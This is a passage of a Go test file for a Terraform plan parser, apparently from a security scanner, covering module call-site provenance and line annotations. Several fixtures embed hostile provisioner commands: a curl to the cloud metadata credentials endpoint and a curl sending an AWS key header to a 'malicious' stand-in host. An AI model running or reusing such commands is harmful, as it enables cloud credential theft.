		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"a.b\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"a]b\"]",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"a]b\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"a\\\"b\"]",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"a\\\"b\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "module.networking.aws_subnet.public",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"cidr_block": map[string]interface{}{"references": []interface{}{"var.subnet_cidr"}}},
	}, meta("aws_subnet", "module.networking.public"))
}

func TestJson_parseTFPlan_dd_tfplan_meta_provisioners(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_instance.web",
						"mode":    "managed",
						"type":    "aws_instance",
						"name":    "web",
						"values":  map[string]interface{}{"instance_type": "t2.micro"},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_instance.web",
						"expressions": map[string]interface{}{
							"instance_type": map[string]interface{}{"constant_value": "t2.micro"},
						},
						"provisioners": []map[string]interface{}{
							{
								"type": "local-exec",
								"expressions": map[string]interface{}{
									"command": map[string]interface{}{"constant_value": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["web"].(map[string]interface{})

	require.Equal(t, []interface{}{
		map[string]interface{}{
			"type": "local-exec",
			"expressions": map[string]interface{}{
				"command": map[string]interface{}{"constant_value": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
			},
		},
	}, entry["provisioners"])
}

// TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_constant_attached
// covers a literal call-site constant, exposed via call_site_expressions.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_constant_attached(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"user_data": map[string]interface{}{"constant_value": "IyEvYmluL2Jhc2gKZWNobyBoaQ=="},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"expressions": map[string]interface{}{
										"user_data": map[string]interface{}{"references": []string{"var.user_data"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"user_data": map[string]interface{}{
			"references": []interface{}{"var.user_data"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{"constant_value": "IyEvYmluL2Jhc2gKZWNobyBoaQ=="},
			},
		},
	}, entry["configuration_expressions"])
}

// TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_reference_attached
// covers a reference passed as a variable: references stays unspliced.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_reference_attached(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"subnet_ref": map[string]interface{}{
								"references": []string{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"expressions": map[string]interface{}{
										"subnet_id": map[string]interface{}{"references": []string{"var.subnet_ref"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"subnet_id": map[string]interface{}{
			"references": []interface{}{"var.subnet_ref"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{
					"references": []interface{}{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
				},
			},
		},
	}, entry["configuration_expressions"])
}

// Regression fixture from a real plan: var.x and base64encode(var.x) serialize
// identically, so neither is asserted equal to the other.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_wrapped_reference_not_asserted_equal(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.child",
						"resources": []map[string]interface{}{
							{
								"address": "module.child.null_resource.test",
								"mode":    "managed",
								"type":    "null_resource",
								"name":    "test",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"child": map[string]interface{}{
						// Real plan output for base64encode(var.outer_cmd), identical
						// to what a bare wrapped_cmd = var.outer_cmd would produce.
						"expressions": map[string]interface{}{
							"wrapped_cmd": map[string]interface{}{"references": []string{"var.outer_cmd"}},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "null_resource.test",
									"expressions": map[string]interface{}{
										"triggers": map[string]interface{}{"references": []string{"var.wrapped_cmd"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["null_resource"].(map[string]interface{})["module.child.test"].(map[string]interface{})

	// references stays "var.wrapped_cmd" - never replaced with the caller's own.
	require.Equal(t, map[string]interface{}{
		"triggers": map[string]interface{}{
			"references": []interface{}{"var.wrapped_cmd"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{"references": []interface{}{"var.outer_cmd"}},
			},
		},
	}, entry["configuration_expressions"])
}

// Uses a child module so callArgs is non-empty; the sibling reference must
// survive untouched alongside the resolved var.env.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_multi_reference_preserved(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"env": map[string]interface{}{
								"references": []string{"aws_vpc.env_tag.value"},
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"expressions": map[string]interface{}{
										"tags": map[string]interface{}{
											"references": []string{"var.env", "aws_vpc.main.id"},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"tags": map[string]interface{}{
			"references": []interface{}{"var.env", "aws_vpc.main.id"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{"references": []interface{}{"aws_vpc.env_tag.value"}},
			},
		},
	}, entry["configuration_expressions"])
}

// "var.settings.selected" and "var.settings" appear together; the bare
// "var.settings" must not get call_site_expressions attached.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_object_traversal_left_unresolved(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_cloudwatch_log_metric_filter.web",
								"mode":    "managed",
								"type":    "aws_cloudwatch_log_metric_filter",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"settings": map[string]interface{}{
								"references": []string{"aws_cloudwatch_log_metric_filter.target.name"},
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_cloudwatch_log_metric_filter.web",
									"expressions": map[string]interface{}{
										"name": map[string]interface{}{
											"references": []string{"var.settings.selected", "var.settings"},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_cloudwatch_log_metric_filter"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"name": map[string]interface{}{
			"references": []interface{}{"var.settings.selected", "var.settings"},
		},
	}, entry["configuration_expressions"])
}

// A provisioner command reading var.command against a literal caller arg
// gets that literal exposed under call_site_expressions.
func TestJson_parseTFPlan_dd_tfplan_meta_provisioner_constant_argument_attached(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.child",
						"resources": []map[string]interface{}{
							{
								"address": "module.child.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"child": map[string]interface{}{
						"expressions": map[string]interface{}{
							"command": map[string]interface{}{
								"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'",
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"provisioners": []map[string]interface{}{
										{
											"type": "local-exec",
											"expressions": map[string]interface{}{
												"command": map[string]interface{}{"references": []string{"var.command"}},
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.child.web"].(map[string]interface{})

	require.Equal(t, []interface{}{
		map[string]interface{}{
			"type": "local-exec",
			"expressions": map[string]interface{}{
				"command": map[string]interface{}{
					"references": []interface{}{"var.command"},
					"call_site_expressions": []interface{}{
						map[string]interface{}{"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'"},
					},
				},
			},
		},
	}, entry["provisioners"])
}

// A constant threaded through two module hops, each with a different
// argument name, must produce an ordered chain, not one collapsed value.
func TestJson_parseTFPlan_dd_tfplan_meta_provisioner_constant_transitive_across_two_modules(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.a",
						"child_modules": []map[string]interface{}{
							{
								"address": "module.a.module.b",
								"resources": []map[string]interface{}{
									{
										"address": "module.a.module.b.aws_instance.web",
										"mode":    "managed",
										"type":    "aws_instance",
										"name":    "web",
										"values":  map[string]interface{}{},
									},
								},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"a": map[string]interface{}{
						"expressions": map[string]interface{}{
							"outer_cmd": map[string]interface{}{
								"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'",
							},
						},
						"module": map[string]interface{}{
							"module_calls": map[string]interface{}{
								"b": map[string]interface{}{
									"expressions": map[string]interface{}{
										"inner_cmd": map[string]interface{}{"references": []string{"var.outer_cmd"}},
									},
									"module": map[string]interface{}{
										"resources": []map[string]interface{}{
											{
												"address": "aws_instance.web",
												"provisioners": []map[string]interface{}{
													{
														"type": "local-exec",
														"expressions": map[string]interface{}{
															"command": map[string]interface{}{"references": []string{"var.inner_cmd"}},
														},
													},
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.a.module.b.web"].(map[string]interface{})

	require.Equal(t, []interface{}{
		map[string]interface{}{
			"type": "local-exec",
			"expressions": map[string]interface{}{
				"command": map[string]interface{}{
					"references": []interface{}{"var.inner_cmd"},
					"call_site_expressions": []interface{}{
						// outermost first: module.a's own call-site expression,
						// then module.b's own call-site expression.
						map[string]interface{}{"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'"},
						map[string]interface{}{"references": []interface{}{"var.outer_cmd"}},
					},
				},
			},
		},
	}, entry["provisioners"])
}

// A two-level module chain must resolve transitively without splicing
// references; call_site_expressions carries the ordered chain instead.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_nested_resolution(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.a",
						"child_modules": []map[string]interface{}{
							{
								"address": "module.a.module.b",
								"resources": []map[string]interface{}{
									{
										"address": "module.a.module.b.aws_instance.web",
										"mode":    "managed",
										"type":    "aws_instance",
										"name":    "web",
										"values":  map[string]interface{}{},
									},
								},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"a": map[string]interface{}{
						"expressions": map[string]interface{}{
							"input": map[string]interface{}{
								"references": []string{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
							},
						},
						"module": map[string]interface{}{
							"module_calls": map[string]interface{}{
								"b": map[string]interface{}{
									"expressions": map[string]interface{}{
										"input": map[string]interface{}{"references": []string{"var.input"}},
									},
									"module": map[string]interface{}{
										"resources": []map[string]interface{}{
											{
												"address": "aws_instance.web",
												"expressions": map[string]interface{}{
													"subnet_id": map[string]interface{}{"references": []string{"var.input"}},
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.a.module.b.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"subnet_id": map[string]interface{}{
			"references": []interface{}{"var.input"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{
					"references": []interface{}{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
				},
				map[string]interface{}{"references": []interface{}{"var.input"}},
			},
		},
	}, entry["configuration_expressions"])
}

// Regression test: a branching module chain must produce a linear-length
// chain, not exponential (was 1,048,574 entries at depth=18 before dedup).
func TestJson_parseTFPlan_dd_tfplan_meta_call_site_chain_grows_linearly_not_exponentially(t *testing.T) {
	const depth = 18

	buildDoc := func(depth int) model.Document {
		moduleCalls := map[string]interface{}{
			"expressions": map[string]interface{}{
				"x": map[string]interface{}{"references": []string{"aws_instance.r1.id"}},
				"y": map[string]interface{}{"references": []string{"aws_instance.r2.id"}},
			},
		}
		cur := moduleCalls
		plannedRoot := map[string]interface{}{"address": "module.a"}
		curPlanned := plannedRoot
		modulePath := "module.a"
		for i := 0; i < depth; i++ {
			next := map[string]interface{}{
				"expressions": map[string]interface{}{
					"x": map[string]interface{}{"references": []string{"var.x", "var.y"}},
					"y": map[string]interface{}{"references": []string{"var.x", "var.y"}},
				},
			}
			cur["module"] = map[string]interface{}{
				"module_calls": map[string]interface{}{"m": next},
			}
			cur = next

			nextPlanned := map[string]interface{}{"address": modulePath + ".module.m"}
			curPlanned["child_modules"] = []map[string]interface{}{nextPlanned}
			curPlanned = nextPlanned
			modulePath += ".module.m"
		}
		cur["module"] = map[string]interface{}{
			"resources": []map[string]interface{}{
				{
					"address": "aws_instance.leaf",
					"expressions": map[string]interface{}{
						"subnet_id": map[string]interface{}{"references": []string{"var.x", "var.y"}},
					},
				},
			},
		}
		curPlanned["resources"] = []map[string]interface{}{
			{
				"address": modulePath + ".aws_instance.leaf",
				"mode":    "managed",
				"type":    "aws_instance",
				"name":    "leaf",
				"values":  map[string]interface{}{},
			},
		}

		return model.Document{
			"format_version":    "1.2",
			"terraform_version": "1.5.0",
			"planned_values": map[string]interface{}{
				"root_module": map[string]interface{}{
					"child_modules": []map[string]interface{}{plannedRoot},
				},
			},
			"resource_changes": []map[string]interface{}{},
			"configuration": map[string]interface{}{
				"root_module": map[string]interface{}{
					"module_calls": map[string]interface{}{"a": moduleCalls},
				},
			},
		}
	}

	chainLength := func(depth int) int {
		got, err := parseTFPlan(buildDoc(depth))
		require.NoError(t, err)

		ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
		require.True(t, ok)
		byType, ok := ddMeta["aws_instance"].(map[string]interface{})
		require.True(t, ok)
		require.Len(t, byType, 1)
		var entry map[string]interface{}
		for _, v := range byType {
			entry = v.(map[string]interface{})
		}
		cfgExpr, ok := entry["configuration_expressions"].(map[string]interface{})
		require.True(t, ok)
		subnetID, ok := cfgExpr["subnet_id"].(map[string]interface{})
		require.True(t, ok)
		chain, ok := subnetID["call_site_expressions"].([]interface{})
		require.True(t, ok, "expected a call_site_expressions chain")
		return len(chain)
	}

	full := chainLength(depth)
	half := chainLength(depth / 2)

	// Exponential growth would make full roughly half*half; linear caps the ratio.
	require.Less(t, full, half*10,
		"call_site_expressions grew super-linearly: depth=%d -> %d entries, depth=%d -> %d entries",
		depth, full, depth/2, half)
	require.Less(t, full, 100,
		"call_site_expressions should stay proportional to the number of real call sites (depth=%d), not explode to %d", depth, full)
}

// sectionsPlan has resources in the root and a child module, count and
// for_each instances, a managed resource that already exists (so it is in
// prior_state too), a data source and a data source being deleted.
const sectionsPlan = `{
  "format_version": "1.2",
  "terraform_version": "1.9.5",
  "planned_values": {
    "root_module": {
      "resources": [
        {
          "address": "aws_s3_bucket.logs",
          "mode": "managed",
          "type": "aws_s3_bucket",
          "name": "logs",
          "values": {
            "bucket": "logs-planned",
            "tags": {
              "env": "prod"
            },
            "versioning": [
              {
                "enabled": true
              }
            ]
          }
        },
        {
          "address": "aws_instance.web[0]",
          "mode": "managed",
          "type": "aws_instance",
          "name": "web",
          "index": 0,
          "values": {
            "ami": "ami-1",
            "vpc_security_group_ids": [
              "sg-1",
              "sg-2"
            ]
          }
        }
      ],
      "child_modules": [
        {
          "address": "module.app",
          "resources": [
            {
              "address": "module.app.aws_s3_bucket.logs[\"eu\"]",
              "mode": "managed",
              "type": "aws_s3_bucket",
              "name": "logs",
              "index": "eu",
              "values": {
                "bucket": "app-eu"
              }
            }
          ]
        }
      ]
    }
  },
  "resource_changes": [
    {
      "address": "aws_s3_bucket.logs",
      "mode": "managed",
      "type": "aws_s3_bucket",
      "name": "logs",
      "change": {
        "actions": [
          "update"
        ],
        "before": {
          "bucket": "logs-prior"
        },
        "after": {
          "bucket": "logs-planned"
        },
        "after_unknown": {
          "arn": true
        }
      }
    },
    {
      "address": "data.aws_iam_policy_document.old",
      "mode": "data",
      "type": "aws_iam_policy_document",
      "name": "old",
      "change": {
        "actions": [
          "delete"
        ]
      }
    }
  ],
  "prior_state": {
    "format_version": "1.0",
    "values": {
      "root_module": {
        "resources": [
          {
            "address": "aws_s3_bucket.logs",
            "mode": "managed",
            "type": "aws_s3_bucket",
            "name": "logs",
            "values": {
              "bucket": "logs-prior"
            }
          },
          {
            "address": "data.aws_iam_policy_document.read",
            "mode": "data",
            "type": "aws_iam_policy_document",
            "name": "read",
            "values": {
              "json": "{}"
            }
          },
          {
            "address": "data.aws_iam_policy_document.old",
            "mode": "data",
            "type": "aws_iam_policy_document",
            "name": "old",
            "values": {
              "json": "{}"
            }
          }
        ]
      }
    }
  },
  "configuration": {
    "root_module": {
      "resources": [
        {
          "address": "aws_s3_bucket.logs",
          "mode": "managed",
          "type": "aws_s3_bucket",
          "name": "logs",
          "expressions": {
            "bucket": {
              "constant_value": "logs-planned"
            }
          }
        }
      ],
      "module_calls": {
        "app": {
          "expressions": {
            "name": {
              "references": [
                "var.name"
              ]
            }
          },
          "module": {
            "resources": [
              {
                "address": "aws_s3_bucket.logs",
                "mode": "managed",
                "type": "aws_s3_bucket",
                "name": "logs",
                "expressions": {
                  "bucket": {
                    "references": [
                      "var.name"
                    ]
                  }
                }
              }
            ]
          }
        }
      }
    }
  }
}
`

// annotatedPlanParse decodes and annotates the entire input before remapping
// it, to compare its section markers with the reduced line-info parse.
func annotatedPlanParse(t *testing.T, content []byte) model.Document {
	t.Helper()
	var doc model.Document
	require.NoError(t, json.Unmarshal(content, &doc))
	parsed, err := parseTFPlan(initializeJSONLine(content).setLineInfo(doc))
	require.NoError(t, err)
	return parsed
}

// withoutLineMarkers returns v as JSON without any _dd_lines key, as the
// scanned document is once sanitized.
func withoutLineMarkers(t *testing.T, v interface{}) string {
	t.Helper()
	b, err := json.Marshal(v)
	require.NoError(t, err)
	var decoded interface{}
	require.NoError(t, json.Unmarshal(b, &decoded))
	var strip func(interface{}) interface{}
	strip = func(v interface{}) interface{} {
		switch t := v.(type) {
		case map[string]interface{}:
			delete(t, "_dd_lines")
			for k, x := range t {
				t[k] = strip(x)
			}
		case []interface{}:
			for i, x := range t {
				t[i] = strip(x)
			}
		}
		return v
	}
	b, err = json.Marshal(strip(decoded))
	require.NoError(t, err)
	return string(b)
}

func compactPlan(t *testing.T) []byte {
	t.Helper()
	var out bytes.Buffer
	require.NoError(t, json.Compact(&out, []byte(sectionsPlan)))
	return out.Bytes()
}

// TestParse_tfplanKeepsEverySectionMarker checks that Parse, which feeds
// test-rules and line-info payload exports, annotates every section of a
// plan, resource_changes included, and that the scan's unannotated parse
// holds the same document without markers.
func TestParse_tfplanKeepsEverySectionMarker(t *testing.T) {
	for name, content := range map[string][]byte{
		"indented": []byte(sectionsPlan),
		"minified": compactPlan(t),
	} {
		t.Run(name, func(t *testing.T) {
			_, docs, _, _, err := (&Parser{}).Parse(context.Background(), content, "plan.json", false, 15)
			require.NoError(t, err)
			require.Len(t, docs, 1)
			require.Equal(t, mustJSON(t, annotatedPlanParse(t, content)), mustJSON(t, docs[0]))
			for _, section := range []string{"resource", "data", "resource_changes", "configuration"} {
				require.Contains(t, mustJSON(t, docs[0][section]), "_dd_lines", section)
			}

			unannotated, ok := (&Parser{}).ParseUnannotated(content, "plan.json")
			require.True(t, ok)
			require.Len(t, unannotated, 1)
			require.NotContains(t, mustJSON(t, unannotated[0]), "_dd_lines")
			require.Equal(t, withoutLineMarkers(t, docs[0]), mustJSON(t, unannotated[0]))
		})
	}
}

// The full parse collapses duplicate object keys before remapping the plan.
// The scan's optimized path must expose the same values in both its document
// sections and metadata, including configuration call-site provenance.
func TestParseUnannotated_tfplanDuplicateMetadataKeys(t *testing.T) {
	const change = `{"address":"aws_s3_bucket.logs","change":{"after_unknown":{"arn":true}}}`
	const configuration = `{"root_module":{"module_calls":{"app":{"expressions":{"name":{"constant_value":"selected"}},"module":{"resources":[{"address":"aws_s3_bucket.logs","expressions":{"bucket":{"references":["var.name"]}}}]}}}}}`
	for _, tt := range []struct {
		name, changes, config string
	}{
		{
			name:    "after_unknown known last",
			changes: `{"address":"aws_s3_bucket.logs","change":{"after_unknown":{"arn":true},"after_unknown":{"arn":false}}}`,
		},
		{
			name:    "after_unknown unknown last",
			changes: `{"address":"aws_s3_bucket.logs","change":{"after_unknown":{"arn":false},"after_unknown":{"arn":true}}}`,
		},
		{
			name:    "after_unknown null last",
			changes: `{"address":"aws_s3_bucket.logs","change":{"after_unknown":{"arn":true},"after_unknown":null}}`,
		},
		{
			name:    "after_unknown object replaced",
			changes: `{"address":"aws_s3_bucket.logs","change":{"after_unknown":{"old":true},"after_unknown":{"arn":false}}}`,
		},
		{
			name:    "nested unknown attribute",
			changes: `{"address":"aws_s3_bucket.logs","change":{"after_unknown":{"arn":true,"arn":false}}}`,
		},
		{
			name:    "change replaced",
			changes: `{"address":"aws_s3_bucket.logs","change":{"after_unknown":{"arn":false}},"change":{"after_unknown":{"arn":true}}}`,
		},
		{
			name:    "change address replaced",
			changes: `{"address":"aws_s3_bucket.wrong","address":"aws_s3_bucket.logs","change":{"after_unknown":{"arn":true}}}`,
		},
		{
			name:   "configuration root replaced",
			config: `{"root_module":{},"root_module":{"resources":[{"address":"aws_s3_bucket.logs","expressions":{"bucket":{"constant_value":"selected"}}}]}}`,
		},
		{
			name:   "configuration address replaced",
			config: `{"root_module":{"resources":[{"address":"aws_s3_bucket.wrong","address":"aws_s3_bucket.logs","expressions":{"bucket":{"constant_value":"selected"}}}]}}`,
		},
		{
			name:   "configuration expressions replaced",
			config: `{"root_module":{"resources":[{"address":"aws_s3_bucket.logs","expressions":{"wrong":{"constant_value":"ignored"}},"expressions":{"bucket":{"constant_value":"selected"}}}]}}`,
		},
		{
			name:   "configuration provisioners replaced",
			config: `{"root_module":{"resources":[{"address":"aws_s3_bucket.logs","provisioners":[{"type":"wrong"}],"provisioners":[{"type":"selected"}]}]}}`,
		},
		{
			name:   "module argument replaced",
			config: strings.Replace(configuration, `"name":{"constant_value":"selected"}`, `"name":{"constant_value":"ignored"},"name":{"constant_value":"selected"}`, 1),
		},
		{
			name:   "module argument references replaced",
			config: strings.Replace(configuration, `"references":["var.name"]`, `"references":["var.wrong"],"references":["var.name"]`, 1),
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			changes, config := tt.changes, tt.config
			if changes == "" {
				changes = change
			}
			if config == "" {
				config = configuration
			}
			content := []byte(fmt.Sprintf(`{
  "format_version":"1.2",
  "planned_values":{"root_module":{
    "resources":[{"address":"aws_s3_bucket.logs","mode":"managed","type":"aws_s3_bucket","name":"logs","values":{"bucket":"root"}}],
    "child_modules":[{"address":"module.app","resources":[{"address":"module.app.aws_s3_bucket.logs","mode":"managed","type":"aws_s3_bucket","name":"logs","values":{"bucket":"child"}}]}]
  }},
  "resource_changes":[%s],
  "configuration":%s
}`, changes, config))
			whole := annotatedPlanParse(t, content)
			got, ok := (&Parser{}).ParseUnannotated(content, "plan.json")
			require.True(t, ok)
			require.Len(t, got, 1)
			require.JSONEq(t, withoutLineMarkers(t, whole), mustJSON(t, got[0]))

			// Adding provenance must not mutate either source section.
			var decoded model.Document
			require.NoError(t, json.Unmarshal(content, &decoded))
			for _, section := range []string{"resource_changes", "configuration"} {
				require.Equal(t, decoded[section], got[0][section], section)
			}
		})
	}
}

func TestParseLineInfo_tfplanMatchesParseResourceSection(t *testing.T) {
	content := []byte(sectionsPlan)
	docs, ok := (&Parser{}).ParseLineInfo(content, "plan.json")
	require.True(t, ok)
	require.Len(t, docs, 1)
	require.ElementsMatch(t, []string{"resource", "configuration"}, keysOf(docs[0]))
	whole := annotatedPlanParse(t, content)
	for _, section := range []string{"resource", "configuration"} {
		require.JSONEq(t, mustJSON(t, whole[section]), mustJSON(t, docs[0][section]), section)
	}

	// The change list is built on demand, annotated as a whole parse is.
	changes, ok := (&Parser{}).ParseLineInfoSection(content, "plan.json", "resource_changes")
	require.True(t, ok)
	require.JSONEq(t, mustJSON(t, whole["resource_changes"]), mustJSON(t, changes))
